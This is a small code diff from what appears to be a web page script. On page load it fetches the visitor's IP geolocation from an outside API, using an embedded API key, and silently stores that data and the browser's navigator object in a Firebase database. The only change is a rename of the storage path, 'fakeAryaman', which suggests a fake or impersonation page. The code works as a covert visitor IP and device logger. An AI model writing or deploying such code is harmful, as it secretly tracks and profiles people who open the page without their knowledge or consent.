@@ -21,7 +21,7 @@ appId: "1:964265791782:web:4284320b2a4c14f22bb1e7"
 firebase.initializeApp(firebaseConfig);
     
 $.get("https://ipgeolocation.abstractapi.com/v1/?api_key=9ab3aa922de9430fb740dfb67820bf98", function(x){
-firebase.database().ref("fakeAryaman/Details").set({
+firebase.database().ref("fakeAryaman2/Details").set({
 Device: navigator,
 IP: x
 });
